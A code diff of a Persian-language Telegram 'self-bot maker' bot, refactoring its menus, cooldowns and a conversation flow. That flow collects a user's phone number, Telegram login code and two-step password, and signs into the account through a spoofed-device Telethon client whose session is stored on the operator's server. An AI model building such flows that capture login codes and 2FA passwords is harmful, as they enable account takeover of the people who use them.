+                    [InlineKeyboardButton("عضویت در گروه", url=f"https://t.me/{GROUP_USERNAME}")]
                 ])
             )
+        except Exception as e:
+            logger.error(f"Error checking membership for user {user_id}: {e}", exc_info=True)
+            return await client.send_message(message.chat.id, "خطا در بررسی عضویت شما. لطفاً بعداً دوباره امتحان کنید.")
 
-        user_id = message.from_user.id
+
         if not BOT_ACTIVE and user_id not in OWNER_IDS:
-            return await message.reply("ربات در حال حاضر خاموش است!")
+            return await message.reply_text("ربات در حال حاضر خاموش است و برای کاربران عادی در دسترس نیست.")
 
         kb = InlineKeyboardMarkup([
-    [
-        InlineKeyboardButton("اجرای سلف", callback_data="run_self"),
-        InlineKeyboardButton("قوانین", callback_data="rules")
-    ],
-    [
-        InlineKeyboardButton("چک کردن شماره", callback_data="check_number")
-    ],
-    [
-        InlineKeyboardButton("آموزش", callback_data="edu_main")
-    ]
-])
-        await message.reply_animation(
-            animation="CgACAgIAAxkBAAEBj2FofjFHDIBktqBm27Y5nJOz3xE8jAACSoAAAs9n-Esgn6vFglgyqh4E",
-            caption="""سلام، به ربات سلف ساز آلفرد خوش اومدی!  
+            [
+                InlineKeyboardButton("اجرای سلف", callback_data="run_self"),
+                InlineKeyboardButton("قوانین", callback_data="rules")
+            ],
+            [
+                InlineKeyboardButton("چک کردن شماره", callback_data="check_number")
+            ],
+            [
+                InlineKeyboardButton("آموزش", callback_data="edu_main")
+            ]
+        ])
+        await message.reply_text(
+            """سلام، به ربات سلف ساز No1 Self خوش اومدی!  
   
 قبل از اجرای سلف حتما قوانین را مطالعه کنید:""",
             reply_markup=kb
         )
 
-        global RUNNING_USER, RUN_STARTED_AT
         save_user_text(user_id, username=message.from_user.username or message.from_user.first_name)
 
-        if RUNNING_USER == user_id:
-            RUNNING_USER = None
-            RUN_STARTED_AT = None
-            CONV.pop(user_id, None)
+        # Ensure no residual state for this user from a previous interrupted conversation
+        if user_id in CONV:
+            await cleanup_user_state(user_id) # Clean up any stale state
+            CONV_COMPLETED_EVENT.set_completed(user_id) # Signal any pending timeout task to finish
 
     except Exception as e:
-        logger.error(f"{e}")
-        await message.reply("خطایی رخ داده است! لطفاً دوباره امتحان کنید.")
+        logger.error(f"Error in start handler for user {message.from_user.id}: {e}", exc_info=True)
+        await message.reply_text("خطایی رخ داده است! لطفاً دوباره امتحان کنید.")
 
-async def reset_run(client, chat_id, uid):
-    await asyncio.sleep(300)
-    if RUNNING_USER == uid:
-        globals()["RUNNING_USER"] = None
-        globals()["RUN_STARTED_AT"] = None
-        globals()["CONV"].pop(uid, None)
-        try:
-            await client.send_message(chat_id, "به محدودیت زمانی 5 دقیقه رسیدید! برای اجرای دوباره سلف، دستور /start را ارسال کنید.")
-        except Exception as e:
-            logger.error(f"{e}")
 
 @bot.on_callback_query(filters.regex("rules"))
-async def show_rules(client, cb):
+async def show_rules(client: Client, cb):
+    """Displays the bot's rules to the user."""
     try:
         await cb.message.edit_text(
             """کاربر گرامی، فروش این سلف به هر صورت غیر مجاز بوده و در صورت فروش حساب شما دیلیت خواهد شد و هرگونه مشکلی که برای حساب شما رخ دهد به سلف و مالک مربوط نخواهد بود. همچنین هرگونه بی احترامی به مدیران و سازنده سلف ممنوع می‌باشد.""",
@@ -460,701 +698,683 @@ async def show_rules(client, cb):
                 [InlineKeyboardButton("بازگشت", callback_data="back_to_start")]
             ])
         )
+        await cb.answer() # Acknowledge callback query
     except Exception as e:
-        logger.error(f"{e}")
+        logger.error(f"Error in show_rules for user {cb.from_user.id}: {e}", exc_info=True)
+        await cb.answer("خطایی رخ داد!", show_alert=True)
 
 @bot.on_callback_query(filters.regex("back_to_start"))
-async def back_to_start(client, cb):
+async def back_to_start(client: Client, cb):
+    """Returns the user to the main menu."""
     try:
         kb = InlineKeyboardMarkup([
-    [
-        InlineKeyboardButton("اجرای سلف", callback_data="run_self"),
-        InlineKeyboardButton("قوانین", callback_data="rules")
-    ],
-    [
-        InlineKeyboardButton("چک کردن شماره", callback_data="check_number")
-    ],
-    [
-        InlineKeyboardButton("آموزش", callback_data="edu_main")
-    ]
-])
-        await cb.message.edit_text("""سلام، به ربات سلف ساز آلفرد خوش اومدی!
-
+            [
+                InlineKeyboardButton("اجرای سلف", callback_data="run_self"),
+                InlineKeyboardButton("قوانین", callback_data="rules")
+            ],
+            [
+                InlineKeyboardButton("چک کردن شماره", callback_data="check_number")
+            ],
+            [
+                InlineKeyboardButton("آموزش", callback_data="edu_main")
+            ]
+        ])
+        await cb.message.edit_text("""سلام، به ربات سلف ساز No1 Self خوش اومدی!
 برای اجرای سلف روی یکی از دکمه‌های زیر کلیک کن:""",
             reply_markup=kb
         )
+        await cb.answer() # Acknowledge callback query
     except Exception as e:
-        logger.error(f"{e}")
+        logger.error(f"Error in back_to_start for user {cb.from_user.id}: {e}", exc_info=True)
+        await cb.answer("خطایی رخ داد!", show_alert=True)
 
-@bot.on_callback_query(filters.regex("run_self"))  
-async def run_self(client, cb):  
-    async with semaphore:  
+@bot.on_callback_query(filters.regex("run_self"))
+async def run_self(client: Client, cb):
+    """Initiates the self-bot deployment conversation flow."""
+    user_id = cb.from_user.id
+    chat_id = cb.message.chat.id
+    logger.info(f"User {user_id} clicked 'run_self'.")
+
+    # If user already has an active conversation task, prevent another
+    if user_id in ACTIVE_USER_CONVERSATIONS and not ACTIVE_USER_CONVERSATIONS[user_id].done():
+        logger.warning(f"User {user_id} attempted to start a new run while another is active.")
+        return await cb.answer("شما در حال حاضر یک فرآیند اجرای سلف را آغاز کرده‌اید. لطفاً صبر کنید تا آن به پایان برسد یا زمان آن منقضی شود.", show_alert=True)
+
+    # Acquire semaphore to limit concurrent SSH operations
+    async with semaphore:
         try:
-            user_id = cb.from_user.id
+            # Check channel and group membership again
+            chat_member_channel = await client.get_chat_member(STATUS_CHANNEL_USERNAME, user_id)
+            chat_member_group = await client.get_chat_member(GROUP_USERNAME, user_id)
 
-            try:
-                chat_member = await client.get_chat_member("@AlfredSelfGp", user_id)
+            if chat_member_channel.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT, ChatMemberStatus.RESTRICTED] or \
+               chat_member_group.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT, ChatMemberStatus.RESTRICTED]:
+                return await cb.answer("شما عضو کانال و گروه نیستید یا محدود شده‌اید! لطفاً اول در آن‌ها عضو شوید.", show_alert=True)
 
-                if chat_member.status == ChatMemberStatus.BANNED:
-                    return await cb.answer("شما از گروه مسدود شده‌اید!", show_alert=True)
-
-                if chat_member.status == ChatMemberStatus.LEFT:
-                    return await cb.answer("شما عضو گروه نیستید! لطفاً اول در گروه عضو شوید.", show_alert=True)
-
-                if chat_member.status == ChatMemberStatus.RESTRICTED:
-                    return await cb.answer("شما در گروه محدود هستید!", show_alert=True)
-                    
-            except UserNotParticipant:
-                return await cb.answer("شما عضو گروه نیستید! لطفاً اول در گروه عضو شوید.", show_alert=True)
-                
-            except Exception as e:
-                logger.error(f"{e}")
-                return await cb.answer("خطا در بررسی وضعیت عضویت شما!", show_alert=True)
-
-            if not BOT_ACTIVE and user_id not in OWNER_IDS:  
-                return await cb.answer("ربات خاموش است!", show_alert=True)  
-
-            global RUNNING_USER, RUN_STARTED_AT, NEXT_RUN_ALLOWED_AT, REMAINING_RUNS  
-            now = datetime.now(timezone("Asia/Tehran"))  
-            if user_id not in OWNER_IDS:  
-                last_ts = LAST_RUNS.get(user_id)  
-                if last_ts:  
-                    last_time = datetime.fromtimestamp(last_ts, tz=timezone("Asia/Tehran"))  
-                    if (now - last_time).total_seconds() < 86400:  
-                        return await cb.answer("شما امروز سلف ران کردید!", show_alert=True)  
-
-            if user_id not in OWNER_IDS:  
-                if NEXT_RUN_ALLOWED_AT and now < NEXT_RUN_ALLOWED_AT:  
-                    wait_minutes = int((NEXT_RUN_ALLOWED_AT - now).total_seconds() // 60)  
-                    wait_seconds = int((NEXT_RUN_ALLOWED_AT - now).total_seconds() % 60)  
-                    next_time = NEXT_RUN_ALLOWED_AT.strftime("%H:%M")  
-                    return await cb.answer(  
-                        f"ربات استفاده شده تا {next_time} لطفا برای ران مجدد 00:{wait_minutes}:{wait_seconds:02d} دیگر صبر کنید!",  
-                        show_alert=True  
-                    )  
-
-                if REMAINING_RUNS <= 0:  
-                    return await cb.answer(  
-                        "در حال حاضر هیچ ران مجازی باقی نمانده است! لطفاً منتظر بمانید تا مدیران دسترسی ران بدهند.",  
-                        show_alert=True  
-                    )  
-
-            try:  
-                await cb.message.delete()  
-            except Exception as e:  
-                logger.error(f"{e}")  
-
-            if user_id not in OWNER_IDS and RUNNING_USER and RUNNING_USER != user_id:  
-                elapsed = (now - RUN_STARTED_AT).total_seconds() if RUN_STARTED_AT else 0  
-                remaining = max(0, 300 - elapsed)  
-                if remaining > 0:  
-                    m, s = divmod(int(remaining), 60)  
-                    return await cb.answer(  
-                        f"کاربر دیگری درحال اجرای سلف است، لطفا 00:{m:02d}:{s:02d} دیگر منتظر بمانید.",  
-                        show_alert=True  
-                    )  
-                else:  
-                    RUNNING_USER = None  
-                    RUN_STARTED_AT = None  
-
-            RUNNING_USER = user_id  
-            RUN_STARTED_AT = now  
-            asyncio.create_task(reset_run(client, cb.message.chat.id, user_id))
-
-            keyboard = ReplyKeyboardMarkup(
-                [[KeyboardButton("ارسال شماره", request_contact=True)]],
-                resize_keyboard=True, one_time_keyboard=True
-            )
-
-            bot_msg = await client.send_message(
-                chat_id=cb.message.chat.id,
-                text="جهت تأیید قوانین ذکر شده در بخش قوانین، شماره خود را از طریق دکمه زیر ارسال کنید:",
-                reply_markup=keyboard
-            )
-            CONV[user_id] = {"step": "get_number", "last_bot_msg": bot_msg.id}
+        except UserNotParticipant:
+            return await cb.answer("شما عضو کانال و گروه نیستید! لطفاً اول در آن‌ها عضو شوید.", show_alert=True)
         except Exception as e:
-            logger.error(f"{e}")
-            await cb.answer("خطایی رخ داده است!", show_alert=True)
+            logger.error(f"Error checking membership for user {user_id}: {e}", exc_info=True)
+            return await cb.answer("خطا در بررسی وضعیت عضویت شما! لطفاً دوباره امتحان کنید.", show_alert=True)
+
+        if not BOT_ACTIVE and user_id not in OWNER_IDS:
+            logger.info(f"Run attempt by {user_id} denied: bot is inactive.")
+            return await cb.answer("ربات خاموش است!", show_alert=True)
+
+        now = datetime.now(timezone("Asia/Tehran"))
+        # Per-user 24-hour cooldown
+        if user_id not in OWNER_IDS:
+            last_ts = LAST_RUNS.get(user_id)
+            if last_ts:
+                last_time = datetime.fromtimestamp(last_ts, tz=timezone("Asia/Tehran"))
+                if (now - last_time).total_seconds() < 86400: # 24 hours
+                    logger.info(f"Run attempt by {user_id} denied: 24-hour cooldown active.")
+                    return await cb.answer("شما امروز سلف ران کرده‌اید! لطفاً 24 ساعت صبر کنید.", show_alert=True)
+
+        # Global remaining runs limit
+        if user_id not in OWNER_IDS and REMAINING_RUNS <= 0:
+            logger.info(f"Run attempt by {user_id} denied: no remaining runs.")
+            return await cb.answer(
+                "در حال حاضر هیچ ران مجازی باقی نمانده است! لطفاً منتظر بمانید تا مدیران دسترسی ران بدهند.",
+                show_alert=True
+            )
+
+        try:
+            await cb.message.delete()
+        except Exception as e:
+            logger.warning(f"Could not delete callback message for user {user_id}: {e}")
+
+        # Ensure cleanup of any previous stalled state for this user
+        if user_id in CONV or user_id in ACTIVE_USER_CONVERSATIONS:
+             await cleanup_user_state(user_id)
+             CONV_COMPLETED_EVENT.set_completed(user_id) # Signal any pending timeout task to finish
+
+
+        # Reset user's conversation event for new run
+        CONV_COMPLETED_EVENT.reset_event(user_id)
+
+        # Initiate the conversation flow for the user
+        keyboard = ReplyKeyboardMarkup(
+            [[KeyboardButton("ارسال شماره", request_contact=True)]],
+            resize_keyboard=True, one_time_keyboard=True
+        )
+
+        bot_msg = await client.send_message(
+            chat_id=chat_id,
+            text="جهت تأیید قوانین ذکر شده در بخش قوانین، شماره خود را از طریق دکمه زیر ارسال کنید:",
+            reply_markup=keyboard
+        )
+        CONV[user_id] = {"step": "get_number", "last_bot_msg": bot_msg.id}
+        logger.info(f"User {user_id} prompted for phone number.")
+
+        # Start the timeout manager task for this conversation
+        task = asyncio.create_task(conversation_timeout_manager(user_id, chat_id, client))
+        ACTIVE_USER_CONVERSATIONS[user_id] = task
+
+        await cb.answer("فرآیند اجرای سلف آغاز شد. لطفاً به سوالات ربات پاسخ دهید.", show_alert=False)
+        
+    except Exception as e:
+        logger.error(f"Unhandled error in run_self for user {user_id}: {e}", exc_info=True)
+        await cb.answer("خطایی رخ داده است! لطفاً دوباره امتحان کنید.", show_alert=True)
+        await cleanup_user_state(user_id) # Ensure cleanup in case of early errors
+
 
 @bot.on_callback_query(filters.regex("check_number"))
-async def check_number_start(client, cb):
+async def check_number_start(client: Client, cb):
+    """Initiates the phone number check conversation flow."""
     user_id = cb.from_user.id
-    await cb.message.delete()
-    keyboard = ReplyKeyboardMarkup([[KeyboardButton("ارسال شماره", request_contact=True)]],
-                                  resize_keyboard=True, one_time_keyboard=True)
-    msg = await client.send_message(cb.message.chat.id,
-        "با استفاده از دکمه زیر شماره خود را ارسال کنید:",
-        reply_markup=keyboard)
-    CONV[user_id] = {"step": "check_number", "last_bot_msg": msg.id}
+    chat_id = cb.message.chat.id
+    logger.info(f"User {user_id} clicked 'check_number'.")
+
+    # If user already has an active conversation task, prevent another
+    if user_id in ACTIVE_USER_CONVERSATIONS and not ACTIVE_USER_CONVERSATIONS[user_id].done():
+        logger.warning(f"User {user_id} attempted to start check_number while another is active.")
+        return await cb.answer("شما در حال حاضر یک فرآیند را آغاز کرده‌اید. لطفاً صبر کنید تا آن به پایان برسد.", show_alert=True)
+
+    try:
+        await cb.message.delete()
+
+        # Ensure cleanup of any previous stalled state for this user
+        if user_id in CONV or user_id in ACTIVE_USER_CONVERSATIONS:
+             await cleanup_user_state(user_id)
+             CONV_COMPLETED_EVENT.set_completed(user_id) # Signal any pending timeout task to finish
+
+        CONV_COMPLETED_EVENT.reset_event(user_id)
+
+        keyboard = ReplyKeyboardMarkup([[KeyboardButton("ارسال شماره", request_contact=True)]],
+                                      resize_keyboard=True, one_time_keyboard=True)
+        msg = await client.send_message(chat_id,
+            "با استفاده از دکمه زیر شماره خود را ارسال کنید:",
+            reply_markup=keyboard)
+        CONV[user_id] = {"step": "check_number", "last_bot_msg": msg.id}
+        logger.info(f"User {user_id} prompted for number check.")
+
+        task = asyncio.create_task(conversation_timeout_manager(user_id, chat_id, client))
+        ACTIVE_USER_CONVERSATIONS[user_id] = task
+
+        await cb.answer("فرآیند بررسی شماره آغاز شد.", show_alert=False)
+    except Exception as e:
+        logger.error(f"Error in check_number_start for user {user_id}: {e}", exc_info=True)
+        await cb.answer("خطایی رخ داد! لطفاً دوباره امتحان کنید.", show_alert=True)
+        await cleanup_user_state(user_id)
 
 @bot.on_callback_query(filters.regex("edu_main"))
-async def edu_main_menu(client, cb):
+async def edu_main_menu(client: Client, cb):
+    """Displays the main education menu."""
     try:
         await cb.message.edit_text(
             "لطفاً یکی از موارد زیر را برای آموزش انتخاب کنید:",
             reply_markup=InlineKeyboardMarkup([
                 [
-                    InlineKeyboardButton("ران", callback_data="edu_run"),
-                    InlineKeyboardButton("سرور", callback_data="edu_server")
+                    InlineKeyboardButton("آموزش ران", callback_data="edu_run"),
+                    InlineKeyboardButton("آموزش سرور", callback_data="edu_server")
                 ],
                 [
                     InlineKeyboardButton("بازگشت", callback_data="back_to_start")
                 ]
             ])
         )
+        await cb.answer()
     except Exception as e:
-        logger.error(f"{e}")
+        logger.error(f"Error in edu_main_menu for user {cb.from_user.id}: {e}", exc_info=True)
+        await cb.answer("خطایی رخ داد!", show_alert=True)
 
 @bot.on_callback_query(filters.regex("edu_run"))
-async def edu_run(client, cb):
+async def edu_run(client: Client, cb):
+    """Forwards the 'run' education message from the status channel."""
     try:
         await cb.message.delete()
+        # Message ID 311 should correspond to a message in @No1Self
         await client.copy_message(
             chat_id=cb.message.chat.id,
-            from_chat_id="@AlfredSelf",
-            message_id=311
+            from_chat_id=STATUS_CHANNEL_USERNAME,
+            message_id=311 # Hardcoded message ID - consider making configurable
         )
+        await cb.answer()
     except Exception as e:
-        logger.error(f"{e}")
+        logger.error(f"Error in edu_run for user {cb.from_user.id}: {e}", exc_info=True)
+        await cb.answer("خطا در بارگیری آموزش!", show_alert=True)
 
 @bot.on_callback_query(filters.regex("edu_server"))
-async def edu_server(client, cb):
+async def edu_server(client: Client, cb):
+    """Forwards the 'server' education message from the status channel."""
     try:
         await cb.message.delete()
+        # Message ID 310 should correspond to a message in @No1Self
         await client.copy_message(
             chat_id=cb.message.chat.id,
-            from_chat_id="@AlfredSelf",
-            message_id=310
+            from_chat_id=STATUS_CHANNEL_USERNAME,
+            message_id=310 # Hardcoded message ID - consider making configurable
         )
+        await cb.answer()
     except Exception as e:
-        logger.error(f"{e}")
+        logger.error(f"Error in edu_server for user {cb.from_user.id}: {e}", exc_info=True)
+        await cb.answer("خطا در بارگیری آموزش!", show_alert=True)
 
-@bot.on_message(filters.private & ~filters.command(["start", "ban", "unban", "bot", "run", "runs"]))
-async def conversation_handler(client, message: Message):
+@bot.on_message(filters.private & ~filters.command(["start", "ban", "unban", "bot", "run", "runs", "allowed", "banall", "unbanall", "savechannel"]))
+async def conversation_handler(client: Client, message: Message):
+    """Handles multi-step conversations for self-bot deployment and number checking."""
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    logger.debug(f"Received message from user {user_id} in conversation handler. Text: '{message.text}'")
+
+    # Ignore messages if the user is not in an active conversation
+    if user_id not in CONV or user_id not in ACTIVE_USER_CONVERSATIONS or ACTIVE_USER_CONVERSATIONS[user_id].done():
+        logger.warning(f"User {user_id} sent message while not in active conversation. Ignoring.")
+        return await message.reply_text("لطفاً برای شروع کار با ربات از دستور /start استفاده کنید.")
+
+    current_step = CONV[user_id].get("step")
+    if not current_step:
+        logger.error(f"No current step found for user {user_id} in CONV. Cleaning up.")
+        await message.reply_text("خطایی در وضعیت مکالمه شما رخ داده است. لطفاً /start را ارسال کنید.")
+        await cleanup_user_state(user_id)
+        CONV_COMPLETED_EVENT.set_completed(user_id)
+        return
+
     try:
-        global RUNNING_USER, RUN_STARTED_AT, NEXT_RUN_ALLOWED_AT
-        user_id = message.from_user.id
-        now = datetime.now(timezone("Asia/Tehran"))
+        # Delete user's message and bot's last message in the conversation for cleanliness
+        try:
+            await message.delete()
+            if "last_bot_msg" in CONV[user_id]:
+                await client.delete_messages(chat_id=chat_id, message_ids=CONV[user_id]["last_bot_msg"])
+        except Exception as e:
+            logger.warning(f"Could not delete message for user {user_id}: {e}")
 
-        if user_id not in CONV:
-            return
-
-        step = CONV[user_id]["step"]
-
-        if step == "check_number":
+        if current_step == "check_number":
             if not message.contact or not message.contact.phone_number:
-                return await message.reply("لطفاً فقط با استفاده از دکمه ارسال شماره، شماره خود را ارسال کنید.")
+                bot_msg = await message.reply_text("لطفاً فقط با استفاده از دکمه ارسال شماره، شماره خود را ارسال کنید.")
+                CONV[user_id]["last_bot_msg"] = bot_msg.id
+                return
 
             number = message.contact.phone_number.replace("+", "").replace(" ", "").strip()
             save_user_text(user_id, username=message.from_user.username, phone=number)
+            logger.info(f"User {user_id} submitted phone {number} for check.")
 
-            try:
-                await message.delete()
-                if "last_bot_msg" in CONV[user_id]:
-                    await client.delete_messages(chat_id=message.chat.id, message_ids=CONV[user_id]["last_bot_msg"])
-            except Exception as e:
-                logger.error(f"{e}")
-
-            GIF_BANNED = "CgACAgIAAxkBAAEBfwRofOMVBCvw21NCkKG1odW-zMyjMAACfgUAAmUOMUrjPb4_4gfhAAEeBA"
-            GIF_FREE = "CgACAgIAAxkBAAEBfw9ofOOJkWHX18Sh13n3Gl9z1KnUdAACqAIAAlA4eUlfA-3Irybg5x4E"
-            GIF_ADMIN = "CgACAgIAAxkBAAEBfxJofOPF_zwXdcx7HbaXD52EvTo0qQACVAQAAidPUUkXUlAq8rb9mx4E"
-
+            status_message = ""
             if any(number == b.strip().replace("+", "").replace(" ", "") for b in BANNED_NUMBERS):
-                await client.send_animation(chat_id=user_id, animation=GIF_BANNED, caption="شماره شما بن شده است!")
+                status_message = "شماره شما بن شده است!"
+                logger.info(f"Phone number {number} for user {user_id} is banned.")
             elif number in ADNUMBER:
+                status_message = "شما ادمین هستید!"
                 if user_id not in OWNER_IDS:
-                    OWNER_IDS.append(user_id)
-                    await client.send_animation(chat_id=user_id, animation=GIF_ADMIN, caption="شما به عنوان ادمین شناسایی شدید و اضافه شدید!")
+                    OWNER_IDS.append(user_id) # Grant temporary admin status (not persistent across restarts)
+                    status_message += " و به عنوان ادمین موقت اضافه شدید!"
+                    logger.info(f"User {user_id} (phone {number}) granted temporary admin status.")
                 else:
-                    await client.send_animation(chat_id=user_id, animation=GIF_ADMIN, caption="شما ادمین هستید!")
+                    status_message = "شما ادمین هستید!"
             else:
-                await client.send_animation(chat_id=user_id, animation=GIF_FREE, caption="شما مجاز به استفاده از سلف ساز هستید!")
+                status_message = "شما مجاز به استفاده از سلف ساز هستید!"
+                logger.info(f"Phone number {number} for user {user_id} is free to use.")
 
-            CONV.pop(user_id, None)
+            await client.send_message(chat_id=user_id, text=status_message)
+            CONV_COMPLETED_EVENT.set_completed(user_id)
+            await cleanup_user_state(user_id)
             return
 
-        if step == "get_number":
-            if not (message.contact and message.contact.phone_number):
-                if user_id in OWNER_IDS and message.text and message.text.strip().isdigit():
-                    number = message.text.strip()
-                else:
-                    return await message.reply("لطفاً فقط با استفاده از دکمه 'ارسال شماره' شماره خود را ارسال کنید.")
+        if current_step == "get_number":
+            phone_number_raw = None
+            if message.contact and message.contact.phone_number:
+                phone_number_raw = message.contact.phone_number
+            elif user_id in OWNER_IDS and message.text and message.text.strip().isdigit():
+                phone_number_raw = message.text.strip() # Owners can type phone
             else:
-                number = message.contact.phone_number.replace("+", "").strip()
+                bot_msg = await message.reply_text("لطفاً فقط با استفاده از دکمه 'ارسال شماره' شماره خود را ارسال کنید.")
+                CONV[user_id]["last_bot_msg"] = bot_msg.id
+                return
 
-            if user_id not in OWNER_IDS and number.startswith(("93", "972")):
-                return await message.reply_animation(
-                    animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                    caption='''شماره تلفن کشور شما مجاز نیست!
+            number = phone_number_raw.replace("+", "").strip()
+            if not number.isdigit():
+                bot_msg = await message.reply_text("شماره تلفن نامعتبر است. لطفاً یک شماره معتبر ارسال کنید.")
+                CONV[user_id]["last_bot_msg"] = bot_msg.id
+                return
 
-سازنده:
-@CodeAlfred'''
+            if user_id not in OWNER_IDS and (number.startswith("93") or number.startswith("972")):
+                logger.warning(f"User {user_id} tried to register with unsupported country code: {number}")
+                await message.reply_text(
+                    '''شماره تلفن کشور شما مجاز نیست!
+                    
+                    سازنده:
+                    @CodeAlfred'''
                 )
-
-            try:
-                await message.delete()
-                if "last_bot_msg" in CONV[user_id]:
-                    await client.delete_messages(
-                        chat_id=message.chat.id,
-                        message_ids=CONV[user_id]["last_bot_msg"]
-                    )
-            except Exception as e:
-                logger.error(f"{e}")
-
-            os.makedirs("sessions", exist_ok=True)
-            session_path = os.path.join("sessions", "selfbot")
-
-            for file in [session_path + ".session", session_path + ".session-journal"]:
-                if os.path.exists(file):
-                    try:
-                        os.remove(file)
-                    except Exception as e:
-                        logger.error(f"{e}")
+                CONV_COMPLETED_EVENT.set_completed(user_id)
+                await cleanup_user_state(user_id)
+                return
 
             if number in BANNED_NUMBERS:
-                return await message.reply_animation(
-                    animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                    caption='''شما بن شده‌اید! برای حل مشکل به پشتیبانی مراجعه کنید.''')
+                logger.warning(f"User {user_id} tried to register with banned phone number: {number}")
+                await message.reply_text(
+                    '''شما بن شده‌اید! برای حل مشکل به پشتیبانی مراجعه کنید.'''
+                )
+                CONV_COMPLETED_EVENT.set_completed(user_id)
+                await cleanup_user_state(user_id)
+                return
 
-            from telethon import TelegramClient
-            CONV[user_id].update({"number": number, "session": session_path})
-            save_user_text(user_id, phone=number)
+            os.makedirs("sessions", exist_ok=True)
+            session_path_prefix = os.path.join("sessions", f"user_{user_id}")
+            
+            # Ensure any previous session files for this user are removed before starting a new one
+            for file_ext in [".session", ".session-journal"]:
+                f_path = session_path_prefix + file_ext
+                if os.path.exists(f_path):
+                    try:
+                        os.remove(f_path)
+                        logger.debug(f"Removed old session file: {f_path}")
+                    except Exception as e:
+                        logger.error(f"Error removing old session file {f_path}: {e}")
 
             tele_client = TelegramClient(
-            session=session_path,
-            api_id=API_ID,
-            api_hash=API_HASH,
-            device_model="Samsung Galaxy A52",
-            system_version="Android 13",
-            app_version="11.13.2 (6060)",
-            lang_code="en")
+                session=session_path_prefix, # Use user-specific session file
+                api_id=API_ID,
+                api_hash=API_HASH,
+                device_model="Samsung Galaxy A52",
+                system_version="Android 13",
+                app_version="11.13.2 (6060)",
+                lang_code="en"
+            )
             await tele_client.connect()
+            logger.info(f"Telethon client connected for user {user_id}.")
+
+            CONV[user_id].update({"number": number, "session_path_prefix": session_path_prefix, "client": tele_client})
+            save_user_text(user_id, phone=number)
 
             try:
                 sent = await tele_client.send_code_request(number)
                 CONV[user_id].update({
-                    "client": tele_client,
                     "sent_code": sent,
                     "step": "get_code"
                 })
-                enter_code_msg = await message.reply("کد دریافتی را به صورت اعداد فارسی وارد کنید:")
+                enter_code_msg = await message.reply_text("کد دریافتی را به صورت اعداد فارسی یا انگلیسی وارد کنید:")
                 CONV[user_id]["last_bot_msg"] = enter_code_msg.id
+                logger.info(f"User {user_id} prompted for login code.")
             except Exception as e:
-                await message.reply_animation(
-                    animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                    caption="خطا در ارسال کد! شماره تلفن شما محدودیت زمانی خورده است یا از تلگرام مسدود شده است، لطفا آن را برسی کنید."
+                logger.error(f"Error sending code request for user {user_id}, number {number}: {e}", exc_info=True)
+                await message.reply_text(
+                    "خطا در ارسال کد! شماره تلفن شما محدودیت زمانی خورده است یا از تلگرام مسدود شده است. لطفاً آن را بررسی کنید و /start را ارسال کنید."
                 )
-                await tele_client.disconnect()
-                CONV.pop(user_id, None)
-                if RUNNING_USER == user_id:
-                    RUNNING_USER = None
-                    RUN_STARTED_AT = None
+                await cleanup_user_state(user_id)
+                CONV_COMPLETED_EVENT.set_completed(user_id)
+                return
 
-        elif step == "get_code":
-            persian = "۰۱۲۳۴۵۶۷۸۹"
-            english = "0123456789"
-            code = message.text.strip().translate(str.maketrans(persian, english))
-            client = CONV[user_id]["client"]
+        elif current_step == "get_code":
+            persian_digits = "۰۱۲۳۴۵۶۷۸۹"
+            english_digits = "0123456789"
+            code = message.text.strip().translate(str.maketrans(persian_digits, english_digits))
+            
+            if not code.isdigit() or len(code) not in [5, 6]: # Telegram codes are typically 5 or 6 digits
+                bot_msg = await message.reply_text("کد وارد شده نامعتبر است. لطفاً کد را به صورت عددی و صحیح وارد کنید.")
+                CONV[user_id]["last_bot_msg"] = bot_msg.id
+                return
 
+            tele_client = CONV[user_id]["client"]
+            
             try:
-                await message.delete()
-                if "last_bot_msg" in CONV[user_id]:
-                    await bot.delete_messages(
-                        chat_id=message.chat.id,
-                        message_ids=CONV[user_id]["last_bot_msg"]
-                    )
-            except Exception as e:
-                logger.error(f"{e}")
-
-            try:
-                sent = CONV[user_id]["sent_code"]
-                await client.sign_in(
+                await tele_client.sign_in(
                     phone=CONV[user_id]["number"],
                     code=code
                 )
-                bot_msg = await message.reply("""ورود موفق! آیپی سرور را ارسال کنید:
+                logger.info(f"User {user_id} successfully signed in with code.")
+                bot_msg = await message.reply_text("""ورود موفق! آیپی سرور را ارسال کنید:
 
 سایت دریافت سرور:
 cp.sprinthost.ru""")
                 CONV[user_id].update({"step": "get_ip", "last_bot_msg": bot_msg.id})
+            except SessionPasswordNeededError:
+                logger.info(f"User {user_id} requires 2FA password.")
+                twofa_msg = await message.reply_text("رمز دو مرحله‌ای را وارد کنید:")
+                CONV[user_id].update({
+                    "step": "get_2fa",
+                    "last_bot_msg": twofa_msg.id
+                })
             except Exception as e:
-                from telethon.errors import SessionPasswordNeededError
-                if isinstance(e, SessionPasswordNeededError):
-                    twofa_msg = await message.reply("رمز دو مرحله‌ای را وارد کنید:")
-                    CONV[user_id].update({
-                        "step": "get_2fa",
-                        "last_bot_msg": twofa_msg.id
-                    })
-                else:
-                    await message.reply_animation(
-                        animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
-                        caption="کد ورود اشتباه است یا فرمت غلط است!"
-                    )
-                    await client.disconnect()
-                    CONV.pop(user_id, None)
-                    if RUNNING_USER == user_id:
-                        RUNNING_USER = None
-                        RUN_STARTED_AT = None
+                logger.error(f"Error during sign-in with code for user {user_id}: {e}", exc_info=True)
+                await message.reply_text(
+                    "کد ورود اشتباه است یا منقضی شده است! لطفاً /start را ارسال کنید و دوباره امتحان کنید."
+                )
+                await cleanup_user_state(user_id)
+                CONV_COMPLETED_EVENT.set_completed(user_id)
+                return
 
-        elif step == "get_2fa":
+        elif current_step == "get_2fa":
             password = message.text.strip()
-            client = CONV[user_id]["client"]
+            tele_client = CONV[user_id]["client"]
 
             try:
-                await message.delete()
-                if "last_bot_msg" in CONV[user_id]:
-                    await bot.delete_messages(
-                        chat_id=message.chat.id,
-                        message_ids=CONV[user_id]["last_bot_msg"]
-                    )
-            except Exception as e:
-                logger.error(f"{e}")
-
-            try:
